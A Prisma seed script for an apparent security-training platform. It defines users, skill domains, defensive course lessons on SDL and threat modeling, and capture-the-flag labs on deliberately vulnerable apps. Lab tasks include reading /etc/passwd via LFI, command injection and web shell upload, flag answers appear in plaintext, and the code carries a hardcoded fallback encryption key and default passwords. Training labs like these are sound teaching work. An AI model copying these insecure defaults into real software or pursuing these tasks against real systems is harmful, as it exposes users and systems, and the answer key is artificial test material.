import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();
import * as bcrypt from 'bcrypt';
import * as crypto from 'crypto';
import { seedLinuxLabs } from './seed-linux-labs';
import { seedLinuxCourses } from './seed-linux-courses';
import { seedLinuxCoursesPart2 } from './seed-linux-courses-part2';
import { seedLinuxCoursesPart3 } from './seed-linux-courses-part3';
import { seedMasterClasses } from './seed-master-classes';
import { seedTrainers } from './seed-trainers';
import { seedCertifications } from './seed-certifications';

const SALT_ROUNDS = 10;
const ENCRYPTION_KEY = process.env.LAB_ENCRYPTION_KEY || 'aeroacademy-labs-default-key-change-in-production-32b!';
const IV_LENGTH = 16;
const ALGORITHM = 'aes-256-cbc';

const SKILL_DOMAINS = [
  {
    name: 'SYSTEMS',
    displayName: 'Systems',
    skills: [
      { name: 'linux', displayName: 'Linux' },
      { name: 'windows', displayName: 'Windows' },
      { name: 'sysadmin', displayName: 'System Administration' },
      { name: 'automation', displayName: 'Automation' },
    ],
  },
  {
    name: 'NETWORKING',
    displayName: 'Networking',
    skills: [
      { name: 'networking', displayName: 'Networking' },
      { name: 'netadmin', displayName: 'Network Administration' },
      { name: 'dns', displayName: 'DNS' },
      { name: 'firewalls', displayName: 'Firewalls' },
    ],
  },
  {
    name: 'DEVOPS',
    displayName: 'DevOps',
    skills: [
      { name: 'docker', displayName: 'Docker' },
      { name: 'cicd', displayName: 'CI/CD' },
      { name: 'kubernetes', displayName: 'Kubernetes' },
      { name: 'terraform', displayName: 'Terraform' },
      { name: 'git', displayName: 'Git' },
    ],
  },
  {
    name: 'DATABASES',
    displayName: 'Databases',
    skills: [
      { name: 'sql', displayName: 'SQL' },
      { name: 'postgresql', displayName: 'PostgreSQL' },
      { name: 'mysql', displayName: 'MySQL' },
      { name: 'dba', displayName: 'Database Administration' },
    ],
  },
  {
    name: 'SECURITY',
    displayName: 'Security',
    skills: [
      { name: 'secops', displayName: 'SecOps' },
      { name: 'devsecops', displayName: 'DevSecOps' },
      { name: 'cybersecurity', displayName: 'Cybersecurity' },
      { name: 'hardening', displayName: 'System Hardening' },
    ],
  },
  {
    name: 'QA',
    displayName: 'QA & Testing',
    skills: [
      { name: 'testing', displayName: 'Testing' },
      { name: 'uat', displayName: 'UAT' },
    ],
  },
  {
    name: 'AI_ML',
    displayName: 'AI & Machine Learning',
    skills: [
      { name: 'machine-learning', displayName: 'Machine Learning' },
      { name: 'deep-learning', displayName: 'Deep Learning' },
      { name: 'nlp', displayName: 'Natural Language Processing' },
      { name: 'computer-vision', displayName: 'Computer Vision' },
      { name: 'mlops', displayName: 'MLOps' },
      { name: 'data-science', displayName: 'Data Science' },
    ],
  },
  {
    name: 'DESIGN',
    displayName: 'Design',
    skills: [
      { name: 'ux', displayName: 'UX Design' },
      { name: 'ui', displayName: 'UI Design' },
      { name: 'figma', displayName: 'Figma' },
      { name: 'accessibility', displayName: 'Accessibility' },
      { name: 'design-systems', displayName: 'Design Systems' },
    ],
  },
];

const LAB_SKILL_MAP: Record<string, string[]> = {
  'Linux': ['SYSTEMS', 'linux'],
  'Ubuntu': ['SYSTEMS', 'linux'],
  'Debian': ['SYSTEMS', 'linux'],
  'CentOS': ['SYSTEMS', 'linux'],
  'Shell': ['SYSTEMS', 'linux'],
  'Scripting': ['SYSTEMS', 'automation'],
  'File Permission': ['SYSTEMS', 'linux'],
  'Process': ['SYSTEMS', 'linux'],
  'Text Processing': ['SYSTEMS', 'linux'],
  'Kernel': ['SYSTEMS', 'linux'],
  'Docker': ['DEVOPS', 'docker'],
  'Container': ['DEVOPS', 'docker'],
  'Kubernetes': ['DEVOPS', 'kubernetes'],
  'Git': ['DEVOPS', 'git'],
  'Gitea': ['DEVOPS', 'git'],
  'Ansible': ['SYSTEMS', 'automation'],
  'Nginx': ['SYSTEMS', 'sysadmin'],
  'Web Server': ['SYSTEMS', 'sysadmin'],
  'Mail': ['SYSTEMS', 'sysadmin'],
  'Postfix': ['SYSTEMS', 'sysadmin'],
  'Prometheus': ['DEVOPS', 'cicd'],
  'Grafana': ['DEVOPS', 'cicd'],
  'Monitoring': ['DEVOPS', 'cicd'],
  'Backup': ['SYSTEMS', 'sysadmin'],
  'Storage': ['SYSTEMS', 'sysadmin'],
  'HAProxy': ['NETWORKING', 'netadmin'],
  'Keepalived': ['NETWORKING', 'netadmin'],
  'High Availability': ['NETWORKING', 'netadmin'],
  'Network': ['NETWORKING', 'networking'],
  'DNS': ['NETWORKING', 'dns'],
  'Firewall': ['NETWORKING', 'firewalls'],
  'VPN': ['NETWORKING', 'firewalls'],
  'IDS': ['NETWORKING', 'firewalls'],
  'IPS': ['NETWORKING', 'firewalls'],
  'Database': ['DATABASES', 'sql'],
  'MySQL': ['DATABASES', 'mysql'],
  'MariaDB': ['DATABASES', 'mysql'],
  'PostgreSQL': ['DATABASES', 'postgresql'],
  'Kali': ['SECURITY', 'cybersecurity'],
  'Security': ['SECURITY', 'cybersecurity'],
  'Hardening': ['SECURITY', 'hardening'],
  'Penetration': ['SECURITY', 'cybersecurity'],
  'Exploitation': ['SECURITY', 'cybersecurity'],
  'Forensic': ['SECURITY', 'cybersecurity'],
  'ModSecurity': ['SECURITY', 'hardening'],
  'OpenSCAP': ['SECURITY', 'hardening'],
  'CIS': ['SECURITY', 'hardening'],
  'Compliance': ['SECURITY', 'hardening'],
  'Linux Automation': ['SYSTEMS', 'automation'],
  'Server Administration': ['SYSTEMS', 'sysadmin'],
  'Centralized Logging': ['SYSTEMS', 'sysadmin'],
  'Machine Learning': ['AI_ML', 'machine-learning'],
  'Deep Learning': ['AI_ML', 'deep-learning'],
  'NLP': ['AI_ML', 'nlp'],
  'Computer Vision': ['AI_ML', 'computer-vision'],
  'MLOps': ['AI_ML', 'mlops'],
  'Data Science': ['AI_ML', 'data-science'],
  'AI': ['AI_ML', 'machine-learning'],
  'LLM': ['AI_ML', 'nlp'],
  'UX': ['DESIGN', 'ux'],
  'UI': ['DESIGN', 'ui'],
  'Figma': ['DESIGN', 'figma'],
  'Accessibility': ['DESIGN', 'accessibility'],
  'Design System': ['DESIGN', 'design-systems'],
  'Wireframe': ['DESIGN', 'ux'],
  'Prototype': ['DESIGN', 'ux'],
};

const FEATURE_UNLOCKS = [
  { feature: 'CORE_LEARNING', requiredLevel: 1, description: 'Access courses and labs' },
  { feature: 'DAILY_MISSIONS', requiredLevel: 2, description: 'Daily missions with XP rewards' },
  { feature: 'SKILL_PROFILE', requiredLevel: 4, description: 'View your skill progression' },
  { feature: 'ACHIEVEMENTS', requiredLevel: 5, description: 'Unlock achievements' },
  { feature: 'LEADERBOARD', requiredLevel: 7, description: 'Compete on the leaderboard' },
  { feature: 'RANKED_CHALLENGES', requiredLevel: 10, description: 'Ranked competitive challenges' },
  { feature: 'TEAM_CHALLENGES', requiredLevel: 15, description: 'Challenge your team' },
  { feature: 'ADVANCED_LABS', requiredLevel: 20, description: 'Access advanced labs' },
  { feature: 'SEASONAL', requiredLevel: 25, description: 'Seasonal competitions' },
];

async function seedSkillDomains(prisma: PrismaClient) {
  for (const domain of SKILL_DOMAINS) {
    const createdDomain = await prisma.skillDomain.upsert({
      where: { name: domain.name },
      update: { displayName: domain.displayName },
      create: { name: domain.name, displayName: domain.displayName },
    });

    for (const skill of domain.skills) {
      await prisma.skill.upsert({
        where: { domainId_name: { domainId: createdDomain.id, name: skill.name } },
        update: { displayName: skill.displayName },
        create: { domainId: createdDomain.id, name: skill.name, displayName: skill.displayName },
      });
    }
  }
}

async function seedLabSkills(prisma: PrismaClient) {
  const labs = await prisma.lab.findMany({ select: { id: true, title: true } });
  const skillDomains = await prisma.skillDomain.findMany({ include: { skills: true } });

  const domainMap = new Map<string, Map<string, string>>();
  for (const sd of skillDomains) {
    const skillMap = new Map<string, string>();
    for (const s of sd.skills) skillMap.set(s.name, s.id);
    domainMap.set(sd.name, skillMap);
  }

  for (const lab of labs) {
    for (const [keyword, [domainName, skillName]] of Object.entries(LAB_SKILL_MAP)) {
      if (lab.title.includes(keyword)) {
        const skillId = domainMap.get(domainName)?.get(skillName);
        if (skillId) {
          await prisma.labSkill.upsert({
            where: { labId_skillId: { labId: lab.id, skillId } },
            update: {},
            create: { labId: lab.id, skillId },
          }).catch(() => {});
        }
      }
    }
  }
}

async function seedFeatureUnlocks(prisma: PrismaClient) {
  for (const u of FEATURE_UNLOCKS) {
    await prisma.featureUnlock.upsert({
      where: { feature: u.feature },
      update: { requiredLevel: u.requiredLevel, description: u.description },
      create: u,
    });
  }
}

async function hashAnswer(answer: string): Promise<string> {
  return bcrypt.hash(answer.trim().toLowerCase(), SALT_ROUNDS);
}

function encryptData(plaintext: string): string {
  const key = crypto.scryptSync(ENCRYPTION_KEY, ENCRYPTION_KEY, 32);
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  let encrypted = cipher.update(plaintext, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function encryptCredentials(credentials: any[]): string {
  return encryptData(JSON.stringify(credentials));
}

async function main() {
  if (process.env.NODE_ENV === 'production') {
    console.error('CRITICAL: prisma db seed must NOT be run in production. Aborting.');
    process.exit(1);
  }

  console.log('Clearing existing data...');
  await prisma.quizSubmission.deleteMany({});
  await prisma.answer.deleteMany({});
  await prisma.question.deleteMany({});
  await prisma.quiz.deleteMany({});
  await prisma.progress.deleteMany({});
  await prisma.labSubmission.deleteMany({});
  await prisma.labInstance.deleteMany({});
  await prisma.userAchievement.deleteMany({});
  await prisma.achievement.deleteMany({});
  await prisma.lesson.deleteMany({});
  await prisma.section.deleteMany({});
  await prisma.course.deleteMany({});
  await prisma.labFlag.deleteMany({});
  await prisma.lab.deleteMany({});
  await prisma.organization.deleteMany({});
  await prisma.team.deleteMany({});
  await prisma.season.deleteMany({});
  await prisma.user.deleteMany({});

  console.log('Seeding organizations...');
  const organizations = [
    { name: 'University of Yaoundé I', type: 'UNIVERSITY', location: 'Yaoundé' },
    { name: 'University of Douala', type: 'UNIVERSITY', location: 'Douala' },
    { name: 'University of Buea', type: 'UNIVERSITY', location: 'Buea' },
    { name: 'University of Bamenda', type: 'UNIVERSITY', location: 'Bamenda' },
    { name: 'University of Dschang', type: 'UNIVERSITY', location: 'Dschang' },
    { name: 'University of Ngaoundéré', type: 'UNIVERSITY', location: 'Ngaoundéré' },
    { name: 'University of Maroua', type: 'UNIVERSITY', location: 'Maroua' },
    { name: 'University of Bafoussam', type: 'UNIVERSITY', location: 'Bafoussam' },
    { name: 'University of Garoua', type: 'UNIVERSITY', location: 'Garoua' },
    { name: 'University of Bertoua', type: 'UNIVERSITY', location: 'Bertoua' },
    { name: 'MTN Cameroon', type: 'ENTERPRISE', location: 'Douala' },
    { name: 'Orange Cameroon', type: 'ENTERPRISE', location: 'Douala' },
    { name: 'Camtel', type: 'GOVERNMENT', location: 'Yaoundé' },
    { name: 'Campost', type: 'GOVERNMENT', location: 'Yaoundé' },
  ];

  const orgMap: Record<string, string> = {};
  for (const org of organizations) {
    const created = await prisma.organization.create({ data: org });
    orgMap[org.name] = created.id;
  }

  const passwordHash = await bcrypt.hash('ChangeMe123!', 10);
  
  const admin = await prisma.user.upsert({
    where: { email: 'user@aeroacademy.org' },
    update: {},
    create: {
      email: 'user@aeroacademy.org',
      name: 'Lead Security Engineer',
      bio: 'Product Security Lead. Expert in SDL and cloud infrastructure security.',
      passwordHash,
      role: 'ADMIN',
      xp: 0,
      organizationId: orgMap['University of Yaoundé I'],
      city: 'Yaoundé',
    },
  });

  const mockStudents = [
    { email: 'amadou@aeroacademy.org', name: 'Amadou Tech', city: 'Garoua', org: 'University of Garoua', xp: 2800 },
    { email: 'fabiola@aeroacademy.org', name: 'Fabiola Sec', city: 'Douala', org: 'University of Douala', xp: 2100 },
    { email: 'moussa@aeroacademy.org', name: 'Moussa Coder', city: 'Maroua', org: 'University of Maroua', xp: 1500 },
    { email: 'awa@aeroacademy.org', name: 'Awa Cyber', city: 'Bamenda', org: 'University of Bamenda', xp: 3200 },
    { email: 'belinga@aeroacademy.org', name: 'Belinga Safe', city: 'Bafoussam', org: 'University of Bafoussam', xp: 900 },
  ];

  const studentIds: string[] = [];
  for (const student of mockStudents) {
    const s = await prisma.user.upsert({
      where: { email: student.email },
      update: {},
      create: {
        email: student.email,
        name: student.name,
        passwordHash,
        city: student.city,
        organizationId: orgMap[student.org],
        xp: student.xp,
        role: 'STUDENT',
      }
    });
    studentIds.push(s.id);
  }

  const team = await prisma.team.create({
    data: {
      name: 'Aero-Elite Squad',
      description: 'The first cohort of elite cybersecurity operatives.',
      ownerId: admin.id,
    }
  });

  await prisma.user.updateMany({
    where: { id: { in: studentIds } },
    data: { teamId: team.id }
  });

  const sqliLab = await prisma.lab.create({
    data: {
      title: 'Advanced Web Exploitation Sandbox',
      description: 'Practice SQL Injection, XSS, and Command Injection against a pre-configured DVWA environment.',
      dockerImage: 'vulnerables/web-dvwa',
      briefing: `### Mission Objective
You have been tasked with auditing a legacy web portal known as DVWA. The target is suspected to contain multiple critical vulnerabilities, including SQL Injection and XSS.

### Operational Guardrails
1. Do not attempt to pivot out of the container network.
2. Ensure all findings are documented in the security registry.
3. Target the 'admin' account for session hijacking research.`,
      tasks: [
        'Identify the SQL Injection vulnerability in the search module.',
        'Extract the database version and schema names.',
        'Bypass the login mechanism using an authentication bypass payload.',
        'Successfully execute a reflected XSS attack in the guestbook.',
        'Exploit a Local File Inclusion (LFI) vulnerability to read /etc/passwd.',
        'Perform Command Injection to execute unauthorized system commands.',
        'Execute a Brute Force attack to recover the administrative credentials.',
        'Bypass file upload restrictions to deploy a functional web shell.'
      ],
      credentials: encryptCredentials([
        { service: 'Web Portal', username: 'admin', password: 'password' },
        { service: 'Database', username: 'root', password: '' }
      ]),
      imageUrl: '/images/labs/dvwa.png',
    }
  });

  const dvwaFlags = [
    { title: 'Database Version', description: 'Extract the database version using an SQL injection payload.', correctAnswer: '10.1.26-MariaDB', points: 100 },
    { title: 'Admin Session Token', description: 'Hijack the admin session and retrieve the secure flag from the dashboard.', correctAnswer: 'AERO{SQLI_MASTER_88}', points: 250 },
    { title: 'System Password File', description: 'Use LFI to retrieve the contents of /etc/passwd and find the hidden flag at the bottom.', correctAnswer: 'AERO{LFI_ROOT_PASSWD}', points: 200 },
    { title: 'RCE Execution', description: 'Execute the command "id" via Command Injection and submit the resulting uid.', correctAnswer: 'uid=33(www-data)', points: 300 },
    { title: 'Credential Brute Force', description: 'Use a wordlist to identify the password for the account "admin" in the Brute Force module.', correctAnswer: 'password', points: 100 },
    { title: 'Web Shell Deployment', description: 'Upload a functional PHP web shell and execute "whoami". Submit the user name.', correctAnswer: 'www-data', points: 350 },
  ];
  for (const flag of dvwaFlags) {
    await prisma.labFlag.create({
      data: { labId: sqliLab.id, ...flag, correctAnswer: await hashAnswer(flag.correctAnswer) }
    });
  }

  const brokenAuthLab = await prisma.lab.create({
    data: {
      title: 'Broken Authentication Sandbox',
      description: 'Analyze insecure session management and credential brute-force vulnerabilities in a controlled environment.',
      dockerImage: 'bkimminich/juice-shop',
      briefing: `### Mission Objective
Target the OWASP Juice Shop to identify flaws in the authentication and session management layers. 

### Operational Guardrails
1. Focus on the 'Admin' and 'Bender' accounts.
2. The environment is highly sensitive; avoid excessive automated scanning that could crash the Node.js backend.`,
      tasks: [
        'Discover the administration dashboard.',
        'Perform an authentication bypass to log in as admin.',
        'Identify the weakness in the password reset mechanism.',
        'Retrieve the hidden support user credentials.'
      ],
      credentials: encryptCredentials([
        { service: 'Customer Portal', username: 'guest', password: 'password123' }
      ]),
      imageUrl: '/images/labs/juiceshop.png',
    }
  });

  const juiceShopFlags = [
    { title: 'Admin Access', description: 'Successfully log in as the administrator.', correctAnswer: 'AERO{AUTH_BYPASS_99}', points: 150 },
    { title: 'Hidden Feedback', description: 'Find and extract the hidden feedback from the support team.', correctAnswer: 'AERO{HIDDEN_VOICE_77}', points: 200 },
  ];
  for (const flag of juiceShopFlags) {
    await prisma.labFlag.create({
      data: { labId: brokenAuthLab.id, ...flag, correctAnswer: await hashAnswer(flag.correctAnswer) }
    });
  }

  const webGoatLab = await prisma.lab.create({
    data: {
      title: 'Enterprise Java Security: WebGoat',
      description: 'Master the exploitation of complex Java-based vulnerabilities in this high-density enterprise environment.',
      dockerImage: 'webgoat/webgoat',
      basePath: '/WebGoat',
      briefing: 'Analyze the WebGoat enterprise application. Focus on insecure deserialization and advanced XML attacks.',
      tasks: ['Complete the SQL injection mitigation lesson.', 'Exploit the insecure deserialization vulnerability.', 'Find the hidden administrative portal.'],
      credentials: encryptCredentials([{ service: 'WebGoat', username: 'guest', password: 'password123' }]),
      imageUrl: '/images/labs/webgoat.png',
    }
  });

  const webGoatFlags = [
    { title: 'Deserialization King', description: 'Achieve RCE through insecure deserialization.', correctAnswer: 'AERO{JAVA_DESER_OBJ}', points: 400 },
    { title: 'Path Traversal Expert', description: 'Read a file outside the web root.', correctAnswer: 'AERO{GOAT_PATH_99}', points: 200 },
  ];
  for (const flag of webGoatFlags) {
    await prisma.labFlag.create({
      data: { labId: webGoatLab.id, ...flag, correctAnswer: await hashAnswer(flag.correctAnswer) }
    });
  }

  const nodeGoatLab = await prisma.lab.create({
    data: {
      title: 'Node.js Security Matrix: NodeGoat',
      description: 'Analyze and secure modern JavaScript applications against NoSQL injection and SSRF.',
      dockerImage: '1njected/nodegoat',
      briefing: 'The NodeGoat environment presents a modern MEAN stack application with typical JavaScript-specific security flaws.',
      tasks: ['Identify NoSQL injection in the login field.', 'Exploit the insecure mass assignment vulnerability.', 'Secure the session management layer.'],
      credentials: encryptCredentials([{ service: 'NodeGoat', username: 'admin', password: 'password' }]),
      imageUrl: '/images/labs/nodegoat.png',
    }
  });

  const nodeGoatFlags = [
    { title: 'NoSQL Master', description: 'Bypass authentication using NoSQL injection.', correctAnswer: 'AERO{NOSQL_BYPASS_NODE}', points: 300 },
    { title: 'Mass Assignment Hunter', description: 'Elevate your privileges via mass assignment.', correctAnswer: 'AERO{NODE_PRIV_ESC}', points: 250 },
  ];
  for (const flag of nodeGoatFlags) {
    await prisma.labFlag.create({
      data: { labId: nodeGoatLab.id, ...flag, correctAnswer: await hashAnswer(flag.correctAnswer) }
    });
  }

  const vapiLab = await prisma.lab.create({
    data: {
      title: 'API Security Sandbox: vAPI',
      description: 'Deep-dive into API security, exploring BOLA, BFLA, and mass assignment in RESTful services.',
      dockerImage: 'roottusk/vapi',
      briefing: 'vAPI is a specialized sandbox for mastering the OWASP API Security Top 10.',
      tasks: ['Identify Broken Object Level Authorization (BOLA).', 'Exploit a Mass Assignment vulnerability in the user profile.', 'Bypass the rate limiting mechanism.'],
      credentials: encryptCredentials([{ service: 'API Gateway', username: 'user1', password: 'password' }]),
      imageUrl: '/images/labs/vapi.png',
    }
  });

  const vapiFlags = [
    { title: 'BOLA Specialist', description: 'Retrieve data from another user account.', correctAnswer: 'AERO{API_BOLA_SUCCESS}', points: 300 },
    { title: 'JWT Architect', description: 'Forge a valid JWT token to gain admin access.', correctAnswer: 'AERO{JWT_FORGERY_VAPI}', points: 450 },
  ];
  for (const flag of vapiFlags) {
    await prisma.labFlag.create({
      data: { labId: vapiLab.id, ...flag, correctAnswer: await hashAnswer(flag.correctAnswer) }
    });
  }

  const course1 = await prisma.course.create({
    data: {
      title: 'Product Security Architecture & SDL',
      description: 'An exhaustive, high-density technical manual on the Secure Development Lifecycle. This course provides an industry-leading deep-dive into architecting resilient systems, scaling security through DevSecOps, and embedding defense into the product fabric.',
      sections: {
        create: [
          {
            title: '1. Theoretical Foundations & SDL',
            order: 1,
            lessons: {
              create: [
                { 
                  title: 'The Evolution of Software Security: From Firewalls to Architecture', 
                  order: 1, 
                  content: `
# The Evolution of Software Security: From Firewalls to Architecture

### 1. The Historical Context: The Era of the Perimeter (1990–2010)
In the formative decades of the digital age, security was fundamentally conceptualized as a **perimeter problem**. The prevailing mental model was the "Castle and Moat" strategy. Organizations focused their defensive investments on building impenetrable walls around their data centers.

#### The Toolkit of the Perimeter Era:
- **Stateful Inspection Firewalls**: Filtering traffic based on IP, port, and protocol.
- **VPNs (Virtual Private Networks)**: Providing secure, encrypted tunnels for remote workers to cross the "moat."
- **DMZs (Demilitarized Zones)**: Isolated network segments for public-facing servers.
- **IDS/IPS Systems**: Monitoring network traffic for known attack signatures.
- **Physical Security**: Guards, biometric access, and "air-gapped" servers.

In this era, the network was the primary defensive line. Anything inside the network was considered "trusted," and anything outside was "untrusted." Security was a "wrap-around" service, often managed by IT teams who had little to no visibility into the actual application code.

### 2. The Great Dissolution: Why the Perimeter Failed
Between 2010 and 2020, three seismic technological shifts rendered the perimeter model obsolete:

#### A. The Cloud Transformation
As data and applications migrated from private servers to public clouds (AWS, GCP, Azure), the "inside" of the network became a logical construct rather than a physical one. We moved from "static infrastructure" to "ephemeral, code-defined infrastructure."

#### B. The Rise of SaaS and Mobility
The modern workforce became mobile. Employees began accessing sensitive internal tools from coffee shops, airplanes, and homes using personal devices. The network was now everywhere, and the concept of a "trusted network" vanished.

#### C. The API Economy and Microservices
Applications transformed from monolithic blocks into interconnected webs of thousands of microservices. Data no longer lived in a single database; it flowed across trust boundaries constantly. Every service became a potential entry point for an attacker.

This necessitated a fundamental shift from **Network Security** to **Product Security**. We could no longer rely on the network to protect a vulnerable application; the application had to protect itself.

### 3. Product Security (ProdSec) vs. Information Security (InfoSec)
It is critical for a security leader to distinguish between these two disciplines, as they require entirely different skill sets, tools, and operational models.

| Aspect | Information Security (InfoSec) | Product Security (ProdSec) |
| :--- | :--- | :--- |
| **Primary Focus** | Internal corporate safety and compliance. | External customer-facing safety and resilience. |
| **Core Assets** | Laptops, email, office networks, HR data. | Source code, APIs, databases, cloud infrastructure. |
| **Typical Tools** | EDR, MDM, Phishing simulations, DLP. | SAST, DAST, SCA, IAST, Threat Modeling, RASP. |
| **Primary Stakeholders** | All employees, HR, Legal, IT. | Software Engineers, Product Managers, DevOps. |
| **Core Goal** | Prevent data theft and business disruption. | Prevent product exploitation and loss of user trust. |

ProdSec engineers are partners to development teams. They don't just "find" bugs; they partner with engineers to "architect" them out of existence.

### 4. The Software Supply Chain Crisis: A Case Study in Transitive Trust
In late 2020, the **SolarWinds** breach redefined our understanding of risk. Attackers didn't break into the target organizations directly; they compromised the *build system* of a trusted software vendor. By injecting malicious code into a signed software update, they gained access to 18,000 customers, including critical government agencies.

#### The Reality of Modern Assembly:
Modern software is not "written"—it is "assembled." Up to 80% of a modern application's code comes from open-source libraries. This has created a massive, invisible attack surface.

**Case Study: The Log4j Incident (2021)**:
A vulnerability in a widely used Java logging library allowed for unauthenticated Remote Code Execution (RCE) on millions of servers globally. This event proved that security teams must have deep visibility into their **Software Bill of Materials (SBOM)** to respond to threats effectively.

### 5. Shift Left: The Economics of High-Performance Security
The concept of "Shifting Left" is the practice of moving security testing and auditing earlier in the development lifecycle. This is not just a technical preference; it is a fundamental business requirement.

#### The Exponential Cost of Failure:
Research from the **Systems Sciences Institute at IBM** found that fixing a security defect in production costs **30 to 100 times more** than fixing it during the design phase.

**The Financial Breakdown of a Bug:**
1.  **Requirement Phase**: $10 to fix (updating a Jira ticket or design doc).
2.  **Design Phase**: $50 to fix (adjusting an architecture diagram or API contract).
3.  **Implementation Phase**: $500 to fix (refactoring code, updating unit tests).
4.  **Verification (QA) Phase**: $5,000 to fix (re-running full test suites, delaying release).
5.  **Production Phase**: $50,000+ to fix (emergency patching, PR damage control, potential fines, loss of customer trust).

### 6. Architecting for Resilience: Core Design Principles
When we talk about "Security Architecture," we are referring to the implementation of cross-cutting defensive patterns that protect the entire product.

#### A. Defense in Depth (Layered Security)
Never rely on a single defensive measure. Assume that every layer of your security will eventually fail. If an attacker bypasses the WAF, do you have an authorization check on the API? If they bypass the API, is the data encrypted at rest in the database?

#### B. Fail-Safe Defaults
By default, the system should be in its most secure state. Access should be denied unless explicitly allowed.
- **Example**: In a firewall, the default rule should be \`DENY ALL\`.
- **Example**: New users should have zero permissions by default.

#### C. Separation of Concerns (Compartmentalization)
If one part of the system is compromised, the damage should be contained. The service that processes credit card payments should be physically and logically isolated from the service that generates user avatars.

#### D. Keep It Simple (KISS)
Complexity is the enemy of security. The more complex a system is, the harder it is to threat model and the more "edge cases" exist for attackers to exploit. A simple, well-understood design is far more secure than a complex "clever" one.

### 7. The Skill Tree of a Product Security Engineer
To excel in this field, you must be part security researcher and part software architect. You need to understand:
- **Coding**: Proficiency in multiple languages (Node, Python, Go, Java).
- **Offense**: Understanding how to think like an attacker (OWASP Top 10).
- **Defense**: Knowing how to implement architectural fixes (mTLS, JWT, RBAC).
- **Culture**: The ability to communicate risk to developers and executives without being a blocker.

### 8. Conclusion: Security as a Catalyst for Trust
In the modern market, security is no longer a "feature"—it is a core component of the brand identity. Companies that prioritize product security don't just protect data; they build a competitive advantage rooted in trust.

In the next lesson, we will dive into the practical art of **Threat Modeling**, where we map out these architectural principles against a real-world system to identify vulnerabilities before the first line of code is ever written.
`
                },
                {
                  title: 'Threat Modeling: The Architectural Blueprint',
                  order: 2,
                  content: `
# Threat Modeling: The Architectural Blueprint

### 1. Introduction: Why We Model Threats
If you wait until code is written to find security flaws, you have already lost. Threat modeling is a structured activity for identifying, quantifying, and addressing security risks in the *design* of a system. It is the "What could go wrong?" phase of the Secure Development Lifecycle (SDL).

A professional threat model answers four fundamental questions (The Shostack Four):
1.  **What are we building?** (Scope and Architecture)
2.  **What can go wrong?** (Threat Identification)
3.  **What are we going to do about it?** (Mitigation)
4.  **Did we do a good job?** (Validation)

### 2. The STRIDE Framework: Categorizing the Chaos
Developed by Microsoft in the late 90s, STRIDE remains the most robust framework for identifying threats. It forces you to look at every component of your system through six different lenses.

| Threat Type | Security Property | Practical Example |
| :--- | :--- | :--- |
| **S**poofing | **Authenticity** | An attacker using a stolen session cookie to impersonate a user. |
| **T**ampering | **Integrity** | A user modifying the \`price\` parameter in an API request. |
| **R**epudiation | **Non-repudiability** | A user making a fraudulent transaction and claiming they didn't do it. |
| **I**nformation Disclosure | **Confidentiality** | An API error message leaking the database version. |
| **D**enial of Service | **Availability** | Flooding a "Search" endpoint with heavy CPU queries. |
| **E**levation of Privilege | **Authorization** | A regular user accessing the \`/admin/delete-user\` endpoint. |

### 3. The DREAD Risk Assessment Model
Once you have identified a list of threats, you need a way to prioritize them. DREAD allows you to assign a numerical score (1-10) to each threat to determine its risk.

1.  **D**amage: How high is the impact if the threat is realized? (1 = low, 10 = total compromise).
2.  **R**eproducibility: How easy is it to repeat the attack? (1 = nearly impossible, 10 = can be automated).
3.  **E**xploitability: How much effort/skill is required? (1 = PhD level, 10 = novice with a browser).
4.  **A**ffected Users: How many users are impacted? (1 = a single user, 10 = the entire base).
5.  **D**iscoverability: How easy is it to find the flaw? (1 = requires source code, 10 = visible in the URL).

**Risk Score = (D + R + E + A + D) / 5**

### 4. The Artifact: Data Flow Diagrams (DFD)
A threat model is only as good as the diagram it is based on. In Product Security, we use **Data Flow Diagrams (DFD)**. Unlike a standard architecture diagram, a DFD focuses on:
- **Processes**: Where the code runs (e.g., the Web Server, the Auth Service).
- **Data Stores**: Where data is at rest (e.g., PostgreSQL, S3 Bucket).
- **Data Flows**: The direction of data movement (e.g., HTTPS request from Browser to API).
- **External Entities**: Things outside our control (e.g., the User, a 3rd party API).
- **Trust Boundaries**: The most critical element. This is where data moves from a low-trust zone (the Internet) to a high-trust zone (our Private VPC).

### 5. Practical Walkthrough: Modeling a Payment Service
Imagine a service where users pay for a subscription using a credit card.

**Step A: Identify Trust Boundaries**
The primary boundary is between the **User's Browser** and our **API Gateway**. Another boundary exists between our **API** and the **Payment Processor** (Stripe/PayPal).

**Step B: Apply STRIDE**
- **Tampering (T)**: Can the user change the \`amount\` field before it reaches the API? (Mitigation: Re-verify price from database).
- **Information Disclosure (I)**: Are we logging the full credit card number (PAN) in our internal logs? (Mitigation: Tokenization and masking).
- **Elevation of Privilege (E)**: Can a user update their subscription status by sending a \`PUT\` request directly to the DB service? (Mitigation: Network-level isolation and API authorization).

### 6. The "Attack Tree" Methodology
For critical features, we often use **Attack Trees**. We start with a goal (e.g., "Steal Admin Credentials") and branch out into all the possible ways to achieve it.
- **Goal**: Steal Admin Credentials
    - **Path 1**: Phishing (Social Engineering)
    - **Path 2**: SQL Injection on the Login Form (Technical)
    - **Path 3**: Brute forcing the MFA code (Logic/Technical)

This allows us to identify "Single Points of Failure" in our security design.

### 7. Common Pitfalls in Threat Modeling
- **Modeling too late**: If you do it after the code is written, it's an "audit," not a "model."
- **Focusing only on the technical**: Don't ignore business logic threats.
- **Getting bogged down in detail**: Start high-level. You don't need to model every single function call.

### 8. Conclusion: From Checklist to Mindset
Threat modeling should not be a bureaucratic checkbox. It should be a collaborative conversation between security and engineering. The ultimate goal is to foster a "Security First" culture where developers automatically ask, "What could go wrong?" every time they design a new feature.
`
                },
                {
                    title: 'Securing Business Logic: Beyond the Syntax',
                    order: 3,
                    content: `
# Securing Business Logic: Beyond the Syntax

### 1. The Blind Spot of Automation
Automated scanners (SAST/DAST) excel at finding technical bugs like SQL Injection or XSS. These are flaws that occur at the *syntax* level and follow predictable patterns. However, the most devastating breaches in modern SaaS platforms are often caused by **Business Logic Flaws**.

A business logic flaw is an error in the design or implementation of the application's unique rules. It isn't a "bug" in the traditional sense; it is an "intended feature" being used in an unintended way.

**Why Scanners Fail:**
Automated tools don't understand your business. They don't know that a user shouldn't be able to "Transfer -$100" to their account, or that "Admin" users shouldn't be able to delete their own audit logs. These require human context and a deep understanding of the application's workflows.

### 2. Taxonomy of Logic Flaws

#### A. Insecure Direct Object Reference (IDOR)
